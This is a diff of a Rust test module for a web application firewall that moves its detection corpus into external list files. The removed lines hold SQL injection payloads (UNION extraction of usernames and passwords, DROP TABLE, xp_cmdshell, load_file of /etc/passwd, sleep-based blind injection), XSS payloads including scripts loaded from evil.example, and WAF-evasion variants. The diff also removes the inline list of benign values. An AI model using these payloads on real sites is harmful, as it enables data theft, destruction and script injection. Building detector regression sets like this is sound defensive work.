@@ -1,327 +1,83 @@
-//! The evaluation set of the detectors and their gates: SQL injection and XSS payloads written
-//! by hand after the well-known lists (numeric and quoted contexts, tautologies, comment
-//! obfuscation, encodings that the rules' transformations undo) and benign values (names with
-//! apostrophes, prose with the keywords, URLs, JSON, addresses, dates, numbers, browsers'
-//! User-Agents). The built-in rules' tests run them through the engine (engine.rs); the
-//! `gates_by_measurement` test below prints what each candidate prefilter keeps and costs.
-//!
-//! The `BYPASS` array holds the payloads of the public WAF-evasion lists (SecLists' fuzzing
-//! corpora and the known WAF-bypass writeups), in the form an attacker's request would carry
-//! them: comments inside keywords, partly encoded keywords, entities and escapes, parser shapes
-//! (`</title>`, unclosed and split tags, backticks). They are known evasions the shipped sets
-//! must keep refusing: refused by the built-in sets together like the rest of the corpus
-//! (`the_whole_filter_refuses_the_corpus_…`) and in the blackbox run (tests/ftw/,
-//! scripts/ftw-convert.py), so a change to a rule, a transformation or a prefilter that lets one
-//! through again fails. A regression set, not a measure of the filter against evasion: it holds
-//! what the sets catch (CRS's own regression tests are that measure).
+//! The evaluation set of the detectors and their gates, read from the lists of tests/corpus/
+//! (one value per line, the format of SecLists, ffuf and Burp Intruder; tests/corpus/README.md
+//! says what each list holds): SQL injection and XSS payloads written by hand after the
+//! well-known lists, benign values (names with apostrophes, prose with the keywords, URLs, JSON,
+//! addresses, dates, numbers, browsers' User-Agents), and known WAF evasions the shipped sets must
+//! keep refusing (a regression set, not a measure of the filter against evasion: CRS's own
+//! regression tests are that). The built-in rules' tests run them through the engine
+//! (engine.rs); the `gates_by_measurement` test prints what each candidate prefilter keeps and
+//! costs; the go-ftw files of tests/ftw/corpus/ are written from them (src/ftw.rs).
 
-pub(crate) const SQLI: &[&str] = &[
-    // Numeric context.
-    "1 union select 1,2,3",
-    "1 UNION ALL SELECT username,password FROM users",
-    "-1 union select null,version()--",
-    "1 or 1=1",
-    "1 OR 1=1--",
-    "1) or (1=1",
-    "1 and 1=2 union select 1",
-    "1 and sleep(5)",
-    "1;drop table users",
-    "1; DROP TABLE users--",
-    "1 order by 3--",
-    "1 having 1=1",
-    "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)",
-    "1 or true",
-    "-1 or 2>1",
-    "1 or 0x50=0x50",
-    "1 and ascii(substring((select database()),1,1))>64",
-    "1 and extractvalue(1,concat(0x7e,version()))",
-    "1 procedure analyse()",
-    "1;select pg_sleep(5)",
-    "1 rlike sleep(1)",
-    "1 or benchmark(10000000,md5(1))",
-    "1 and 1 in (select 1)",
-    "1 union select load_file('/etc/passwd')",
-    "1 into outfile '/tmp/x'",
-    // Quoted context.
-    "' or '1'='1",
-    "' OR 1=1--",
-    "admin'--",
-    "admin' #",
-    "admin'/*",
-    "' or ''='",
-    "\" or \"\"=\"",
-    "\" or 1=1#",
-    "') or ('1'='1",
-    "' union select null,null--",
-    "1' and '1'='1",
-    "' or 1=1 limit 1 -- -",
-    "'; exec xp_cmdshell 'dir'--",
-    "' AND 1=CONVERT(int,@@version)--",
-    "'; waitfor delay '0:0:5'--",
-    "1' AND SLEEP(5) AND '1'='1",
-    "' or 'a'='a",
-    "'||'",
-    "'||(select 1)||'",
-    "x' AND 1=(SELECT COUNT(*) FROM tabname); --",
-    "' HAVING 1=1--",
-    "' GROUP BY columnnames having 1=1 --",
-    "1' ORDER BY 1--+",
-    "' or sleep(5)#",
-    "admin\") or (\"1\"=\"1",
-    "1' or '1'='1' /*",
-    "' and 1 in (select min(name) from sysobjects)--",
-    "'; shutdown--",
-    "' or username like '%admin%",
-    "x' or 1=1 or 'x'='y",
-    "Robert'); DROP TABLE Students;--",
-    "1' and extractvalue(1,concat(0x7e,(select user())))--",
-    "' union all select @@version--",
-    // Comment and case obfuscation.
-    "1 UnIoN/**/SeLeCt 1,2",
-    "1/**/or/**/1=1",
-    "1 /*!union*/ /*!select*/ 1",
-    "'/**/or/**/'1'='1",
-    "1 union%0aselect 1",
-    "1'/**/UnIoN/**/SeLeCt/**/1--",
-    "1 uNiOn aLl sElEcT nUlL--",
-];
+use std::sync::LazyLock;
+
+/// The values of a list: every line that is not empty, a `\r` before its end dropped.
+pub(crate) fn lines(text: &'static str) -> Vec<&'static str> {
+    text.split('\n')
+        .map(|line| line.strip_suffix('\r').unwrap_or(line))
+        .filter(|line| !line.is_empty())
+        .collect()
+}
+
+/// The values of a `-urlencoded` list: each line percent-decoded (what a plain line cannot hold,
+/// a newline in a value).
+fn decoded(text: &'static str) -> Vec<&'static str> {
+    lines(text)
+        .into_iter()
+        .map(|line| {
+            let mut bytes = Vec::new();
+            let raw = line.as_bytes();
+            let mut i = 0;
+            while i < raw.len() {
+                let hex = |b: u8| (b as char).to_digit(16);
+                if raw[i] == b'%'
+                    && let (Some(h), Some(l)) = (
+                        raw.get(i + 1).and_then(|b| hex(*b)),
+                        raw.get(i + 2).and_then(|b| hex(*b)),
+                    )
+                {
+                    bytes.push((h * 16 + l) as u8);
+                    i += 3;
+                    continue;
+                }
+                bytes.push(raw[i]);
+                i += 1;
+            }
+            let text = String::from_utf8(bytes).unwrap_or_else(|_| panic!("not UTF-8 once decoded: {line}"));
+            &*Box::leak(text.into_boxed_str())
+        })
+        .collect()
+}
+
+pub(crate) static SQLI: LazyLock<Vec<&'static str>> =
+    LazyLock::new(|| lines(include_str!("../../tests/corpus/sqli.txt")));
+
+pub(crate) static XSS: LazyLock<Vec<&'static str>> =
+    LazyLock::new(|| lines(include_str!("../../tests/corpus/xss.txt")));
+
+/// Known evasions, those of a plain line and those a line holds only percent-encoded.
+pub(crate) static BYPASS: LazyLock<Vec<&'static str>> = LazyLock::new(|| {
+    let mut values = lines(include_str!("../../tests/corpus/bypass.txt"));
+    values.extend(decoded(include_str!("../../tests/corpus/bypass-urlencoded.txt")));
+    values
+});
 
 /// Benign values of parameters, cookies and form fields.
-pub(crate) const BENIGN: &[&str] = &[
-    // Near the rules of the measured gaps (wf-942-180..200, wf-941-160/170): prose that has their
-    // words without their shape.
-    "it's #1",
-    "O'Brien -- CEO",
-    "the procedure analyses the data",
-    "power failure; shutdown at 5",
-    "a < b and c > d",
-    "java script course for beginners",
-    // Not here: "he said 'no' -- then left", the known false positive of wf-942-140 (high: it
-    // refuses only with another hit; its doc says so).
-    "O'Brien",
-    "D'Angelo",
-    "Patrick O'Neil",
-    "Sinéad O'Connor",
-    "rock 'n' roll",
-    "it's fine",
-    "don't stop me now",
-    "l'Oréal Paris",
-    "McDonald's",
-    "O'Reilly & Associates",
-    "I'd like 2 or 3",
-    "it's 5 o'clock somewhere",
-    "5'11\"",
-    "can't, won't, shouldn't",
-    "black and white",
-    "this or that",
-    "Select your size",
-    "please select one option from the list",
-    "union station",
-    "order by price",
-    "drop me a line",
-    "insert coin to continue",
-    "update available",
-    "where are you from",
-    "from here to there",
-    "1 or 2 items",
-    "5 and 6",
-    "cats and dogs or birds",
-    "Tom & Jerry",
-    "fish & chips",
-    "how to select from a list in python",
-    "SQL union vs join",
-    "\"quoted text\"",
-    "'single quoted'",
-    "He said \"hello\" and left",
-    "Jean-Luc Picard",
-    "https://example.com/path?a=1&b=2",
-    "http://localhost:8080/",
-    "/images/logo.png",
-    "{\"a\":1,\"b\":[1,2]}",
-    "{\"name\":\"O'Brien\",\"tags\":[\"x\",\"y\"]}",
-    "[1,2,3]",
-    "john.doe+tag@example.com",
-    "2026-11-08",
-    "11/08/2026",
-    "2026-11-08T10:00:00Z",
-    "10:30",
-    "42",
-    "-3.14",
-    "1e10",
-    "+33 1 23 45 67 89",
-    "(555) 123-4567",
-    "Hello, world!",
-    "a = b",
-    "x=1",
-    "price: $10 (incl. tax)",
-    "50% off!",
-    "C# and C++",
-    "#hashtag",
-    "--verbose",
-    "foo -- bar",
-    "semi; colon",
-    "1;2;3",
-    "a||b",
-    "key=value; other=thing",
-    "dGVzdA==",
-    "550e8400-e29b-41d4-a716-446655440000",
-    "#ff0000",
-    "Mr. & Mrs. Smith",
-    "100% cotton (machine wash)",
-    "Q&A: what's new?",
-    "see you @ 5pm",
-    "a < b",
-    "1 < 2 and 3 > 2",
-    "I <3 you",
-    "AT&T",
-    "**bold** and _italic_",
-    "[link](https://example.com)",
-    "C:\\Users\\me\\file.txt",
-    "javascript is fun",
-    "on sale now",
-    "turn on the light",
-    "onboarding checklist",
-    "color=red&size=m",
-    "<b>bold</b>",
-    "<p>Hello</p>",
-    "<br>",
-    "<i>it</i>",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-    "curl/8.5.0",
-    "Googlebot/2.1 (+http://www.google.com/bot.html)",
-    "https://www.google.com/",
-    "https://example.com/search?q=shoes&page=2",
-    "android-app://com.google.android.gm/",
-    "session=abc123def456",
-    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2lnbmF0dXJl",
-];
+pub(crate) static BENIGN: LazyLock<Vec<&'static str>> =
+    LazyLock::new(|| lines(include_str!("../../tests/corpus/benign.txt")));
 
-pub(crate) const XSS: &[&str] = &[
-    "<script>alert(1)</script>",
-    "<ScRiPt>alert(1)</sCrIpT>",
-    "<script src=//evil.example/x.js></script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg onload=alert(1)>",
-    "<svg/onload=alert(1)>",
-    "<body onload=alert(1)>",
-    "<iframe src=javascript:alert(1)>",
-    "<a href=\"javascript:alert(1)\">x</a>",
-    "\"><script>alert(1)</script>",
-    "'><img src=x onerror=alert(1)>",
-    "\" onmouseover=\"alert(1)",
-    "' onfocus='alert(1)' autofocus='",
-    "\" autofocus onfocus=alert(1) x=\"",
-    "x onerror=alert(1)",
-    "<details open ontoggle=alert(1)>",
-    "<input autofocus onfocus=alert(1)>",
-    "<video><source onerror=alert(1)>",
-    "<object data=javascript:alert(1)>",
-    "<embed src=javascript:alert(1)>",
-    "<style>@import'javascript:alert(1)'</style>",
-    "<div style=\"background:url(javascript:alert(1))\">",
-    "<div style=\"x:expression(alert(1))\">",
-    "&lt;script&gt;alert(1)&lt;/script&gt;",
-    "%3Cscript%3Ealert(1)%3C/script%3E",
-    "%253Cscript%253Ealert(1)%253C/script%253E",
-    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
-    "\\u003cimg src=x onerror=alert(1)\\u003e",
-    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
-    "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
-    "<base href=javascript:alert(1)//>",
-    "<form action=javascript:alert(1)><input type=submit>",
-    "<marquee onstart=alert(1)>",
-    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
-    "<x onclick=alert(1)>click",
-    "<scr<script>ipt>alert(1)</script>",
-    "<<script>alert(1)//<</script>",
-    "<svg><script>alert&#40;1&#41;</script>",
-    "<img src=\"x\" onerror=\"alert(1)\"/>",
-    "<frameset onload=alert(1)>",
-    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
-    "<link rel=stylesheet href=javascript:alert(1)>",
-    "<table background=javascript:alert(1)>",
-    "<isindex action=javascript:alert(1) type=image>",
-    "<xss style=\"behavior:url(x.htc)\">",
-    "<!--<img src=\"--><img src=x onerror=alert(1)//\">",
-    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
-    "<button formaction=javascript:alert(1)>x</button>",
-    "<keygen autofocus onfocus=alert(1)>",
-    "<select autofocus onfocus=alert(1)>",
-];
+#[cfg(test)]
+mod tests {
+    use super::*;
 
-/// The payloads of the public WAF-evasion lists, in the form the request carries them: what the
-/// corpora above are, with the obfuscation an attacker adds to keep a filter from seeing them.
-/// Everything here must be refused by the built-in sets together: an evasion added here comes with
-/// the rule that catches it, and one the sets let through stays out of this list.
-pub(crate) const BYPASS: &[&str] = &[
-    // Comments and encodings inside the keywords (MySQL reads `un/**/ion`, a filter that strips
-    // comments with a space or a keyword search on the raw bytes does not).
-    "1 un/**/ion sel/**/ect 1,2",
-    "1'/**/and/**/'1'='1",
-    "1 union/*foo*/select 1,2",
-    "1 /*!50000union*/ /*!50000select*/ 1",
-    "1 uni%6Fn select 1",
-    "1%20union%20select%201",
-    "1%27%20or%201%3D1",
-    "%2527 or 1=1",
-    // No spaces, the wrong spaces.
-    "1'OR'1'='1",
-    "1' and '1'like'1",
-    "1'\tor 1=1",
-    "1'\nOR 1=1",
-    // Tautologies of the shapes the quoted and numeric rules take apart.
-    "1 AND 2=2",
-    "1 and 3>2",
-    "1 and (1)=(1)",
-    "1 and 1 in (1)",
-    "1 or 1=1 limit 0,1",
-    "0' xor 1=1 #",
-    // The named calls and tables, with what else the rule looks for.
-    "1'||sleep(5)||'",
-    "1;exec('select 1')--",
-    "1;EXEC xp_cmdshell('dir')",
-    "1' group by 1 having 1=1 --",
-    "1' and exists(select 1)--",
-    "1' or exists(select * from users)--",
-    "1 union (select 1,2)",
-    "1 union select 1,2,3 from information_schema.tables--",
-    "' UNION SELECT table_name FROM information_schema.tables#",
-    // Parser shapes: what closes a tag or an attribute context first, entities of the named
-    // characters and the handlers, backticks, encodings of the same.
-    "&#X3C;script&#X3E;alert(1)&#X3C;/script&#X3E;",
-    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
-    "<svg onload=alert&lpar;1&rpar;>",
-    "<img src=x onerror=alert&lpar;1&rpar;>",
-    "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
-    "<script>\\u0061lert(1)</script>",
-    "<a href=\"javascript&#58;alert(1)\">x</a>",
-    "<a href=\"javascript&colon;alert(1)\">x</a>",
-    "<a href=\"java&#x0A;script:alert(1)\">x</a>",
-    "<a href=\"jav\tascript:alert(1)\">x</a>",
-    "<img/src=`x`/onerror=alert(1)>",
-    "<img src=`x`onerror=alert(1)>",
-    "<img src=x:x onerror=alert(1)>",
-    "<img onerror=alert(1) src>",
-    "<style onload=alert(1)></style>",
-    "<body onpageshow=alert(1)>",
-    "<body background=javascript:alert(1)>",
-    "<input onauxclick=alert(1)>",
-    "<xss id=x tabindex=1 onactivate=alert(1)></xss>",
-    "</title><script>alert(1)</script>",
-    "</textarea><script>alert(1)</script>",
-    "</style><script>alert(1)</script>",
-    "<svg onload=alert(1)//",
-    "<svg onload=alert(1)<!--",
-    "<svg\tonload=alert(1)>",
-    "<object onerror=alert(1)>",
-    "<video src=x onerror=alert(1)>",
-    "<audio src=x onerror=alert(1)>",
-    "<svg><a xlink:href=javascript:alert(1)><text x=10 y=10>click</text></a></svg>",
-    "<math href=javascript:alert(1)>click</math>",
-    "<script/xss src=//evil.example/x.js></script>",
-    "<isindex type=image src=1 onerror=alert(1)>",
-    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
-    "%3Csvg%2Fonload%3Dalert%281%29%3E",
-];
+    #[test]
+    fn the_lists_read_as_written() {
+        assert_eq!(SQLI.len(), 65);
+        assert_eq!(XSS.len(), 50);
+        assert_eq!(BYPASS.len(), 61);
+        assert_eq!(BENIGN.len(), 104);
+        assert!(BYPASS.contains(&"1'\nOR 1=1"), "the encoded list decoded");
+        assert!(BYPASS.contains(&"1'\tor 1=1"), "a tab kept in a plain line");
+        assert!(BENIGN.contains(&"Sinéad O'Connor"), "UTF-8 kept");
+        assert_eq!(lines("a\r\n\nb\n"), ["a", "b"]);
+    }
+}
